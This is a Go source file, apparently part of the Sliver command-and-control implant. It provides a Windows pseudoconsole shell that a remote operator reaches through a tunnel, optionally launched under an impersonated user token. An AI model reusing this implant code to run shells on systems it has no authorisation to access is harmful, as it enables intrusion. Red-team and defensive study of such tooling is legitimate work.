//go:build windows

package shell

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"fmt"
	"math"
	"os"
	"sync"
	"unsafe"

	"github.com/bishopfox/sliver/implant/sliver/priv"
	"golang.org/x/sys/windows"
)

// Geometry used when the client could not report the size of its own terminal.
// CreatePseudoConsole rejects an empty screen buffer.
const (
	defaultConPTYRows = 24
	defaultConPTYCols = 80
)

// conPTYSupported reports whether the host exposes the ConPTY API, which was
// introduced in Windows 10 1809. The x/sys wrappers resolve the exports
// lazily and panic when they are missing, so one has to be looked up before
// any of them is called.
var conPTYSupported = sync.OnceValue(func() error {
	return windows.NewLazySystemDLL("kernel32.dll").NewProc("CreatePseudoConsole").Find()
})

// conPTY owns a pseudoconsole and the shell process attached to it.
type conPTY struct {
	// mutex guards the handles against a stop request racing the reaper.
	mutex   sync.Mutex
	hpc     windows.Handle
	process windows.Handle

	in  *os.File
	out *os.File

	done     chan struct{}
	exitCode uint32
}

// conptyShell - Start a shell attached to a pseudoconsole
func conptyShell(tunnelID uint64, command []string, rows, cols uint16) (*Shell, error) {
	// {{if .Config.Debug}}
	log.Printf("[conpty] %s", command)
	// {{end}}

	if err := conPTYSupported(); err != nil {
		return nil, err
	}

	// The pseudoconsole reads shell input from inRead and writes shell output
	// to outWrite. It duplicates both, so this process keeps only the opposite
	// ends of the two pipes.
	var inRead, inWrite, outRead, outWrite windows.Handle
	if err := windows.CreatePipe(&inRead, &inWrite, nil, 0); err != nil {
		return nil, err
	}
	if err := windows.CreatePipe(&outRead, &outWrite, nil, 0); err != nil {
		_ = windows.CloseHandle(inRead)
		_ = windows.CloseHandle(inWrite)
		return nil, err
	}

	var hpc windows.Handle
	err := windows.CreatePseudoConsole(conPTYSize(uint32(rows), uint32(cols)), inRead, outWrite, 0, &hpc)
	_ = windows.CloseHandle(inRead)
	_ = windows.CloseHandle(outWrite)
	if err != nil {
		_ = windows.CloseHandle(inWrite)
		_ = windows.CloseHandle(outRead)
		return nil, err
	}

	pid, process, err := startConPTYProcess(hpc, command)
	if err != nil {
		windows.ClosePseudoConsole(hpc)
		_ = windows.CloseHandle(inWrite)
		_ = windows.CloseHandle(outRead)
		return nil, err
	}

	console := &conPTY{
		hpc:     hpc,
		process: process,
		in:      os.NewFile(uintptr(inWrite), "conpty-in"),
		out:     os.NewFile(uintptr(outRead), "conpty-out"),
		done:    make(chan struct{}),
	}
	go console.reap()

	return &Shell{
		ID:        tunnelID,
		Pid:       int(pid),
		EnablePTY: true,
		Stdout:    console.out,
		Stdin:     &conPTYInput{console: console},
		Cancel:    console.kill,
		wait:      console.wait,
	}, nil
}

// startConPTYProcess launches command attached to hpc. os/exec cannot be used
// here: a pseudoconsole reaches its client through STARTUPINFOEX, which
// syscall.SysProcAttr does not expose.
func startConPTYProcess(hpc windows.Handle, command []string) (uint32, windows.Handle, error) {
	appName, err := windows.UTF16PtrFromString(command[0])
	if err != nil {
		return 0, 0, err
	}
	cmdLine, err := windows.UTF16PtrFromString(windows.ComposeCommandLine(command))
	if err != nil {
		return 0, 0, err
	}

	attrs, err := windows.NewProcThreadAttributeList(1)
	if err != nil {
		return 0, 0, err
	}
	defer attrs.Delete()
	// An HPCON is a pointer to a pseudoconsole owned by conhost, and the
	// attribute takes that pointer by value rather than a pointer to it.
	pseudoConsole := unsafe.Pointer(hpc) //nolint:govet // PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE expects the HPCON itself.
	err = attrs.Update(windows.PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, pseudoConsole, unsafe.Sizeof(hpc))
	if err != nil {
		return 0, 0, err
	}

	startupInfo := windows.StartupInfoEx{ProcThreadAttributeList: attrs.List()}
	startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
	flags := uint32(windows.EXTENDED_STARTUPINFO_PRESENT | windows.CREATE_UNICODE_ENVIRONMENT)

	// The pseudoconsole supplies the child's standard handles, so unlike the
	// piped shell nothing has to be inherited.
	var procInfo windows.ProcessInformation
	if priv.CurrentToken != 0 {
		err = windows.CreateProcessAsUser(priv.CurrentToken, appName, cmdLine, nil, nil, false, flags, nil, nil, &startupInfo.StartupInfo, &procInfo)
	} else {
		err = windows.CreateProcess(appName, cmdLine, nil, nil, false, flags, nil, nil, &startupInfo.StartupInfo, &procInfo)
	}
	if err != nil {
		return 0, 0, err
	}
	_ = windows.CloseHandle(procInfo.Thread)

	return procInfo.ProcessId, procInfo.Process, nil
}

// reap waits for the shell to exit and then releases the pseudoconsole.
// Releasing it is what closes the last writer of the output pipe, so it cannot
// be deferred until wait is called: the tunnel drains shell output to EOF
// before anything waits on the process.
func (c *conPTY) reap() {
	defer close(c.done)

	_, err := windows.WaitForSingleObject(c.process, windows.INFINITE)
	if err == nil {
		_ = windows.GetExitCodeProcess(c.process, &c.exitCode)
	}
	c.release()
}

// wait blocks until the shell has exited and its pseudoconsole is gone.
func (c *conPTY) wait() error {
	<-c.done
	if c.exitCode != 0 {
		return fmt.Errorf("exit status %d", c.exitCode)
	}
	return nil
}

// kill terminates the shell. release clears the handle once the process has
// exited, so a late stop request cannot act on a recycled handle.
func (c *conPTY) kill() {
	c.mutex.Lock()
	defer c.mutex.Unlock()

	if c.process != 0 {
		_ = windows.TerminateProcess(c.process, 1)
	}
}

// release closes the pseudoconsole, which terminates whatever is still
// attached to it and lets the output pipe reach EOF.
func (c *conPTY) release() {
	c.mutex.Lock()
	defer c.mutex.Unlock()

	if c.hpc != 0 {
		windows.ClosePseudoConsole(c.hpc)
		c.hpc = 0
	}
	if c.process != 0 {
		_ = windows.CloseHandle(c.process)
		c.process = 0
	}
}

func (c *conPTY) resize(rows, cols uint32) error {
	c.mutex.Lock()
	defer c.mutex.Unlock()

	if c.hpc == 0 {
		return nil
	}
	return windows.ResizePseudoConsole(c.hpc, conPTYSize(rows, cols))
}

// conPTYInput is the shell's standard input. It also carries the resize hook
// that the shell resize handler looks for on a tunnel's writer.
type conPTYInput struct {
	console *conPTY
}

func (w *conPTYInput) Write(b []byte) (int, error) {
	return w.console.in.Write(b)
}

func (w *conPTYInput) Close() error {
	return w.console.in.Close()
}

func (w *conPTYInput) Resize(rows, cols uint32) error {
	return w.console.resize(rows, cols)
}

// conPTYSize clamps a requested geometry into the positive int16 range that
// the pseudoconsole APIs accept.
func conPTYSize(rows, cols uint32) windows.Coord {
	if rows == 0 {
		rows = defaultConPTYRows
	}
	if cols == 0 {
		cols = defaultConPTYCols
	}
	if rows > math.MaxInt16 {
		rows = math.MaxInt16
	}
	if cols > math.MaxInt16 {
		cols = math.MaxInt16
	}
	return windows.Coord{X: int16(cols), Y: int16(rows)}
}
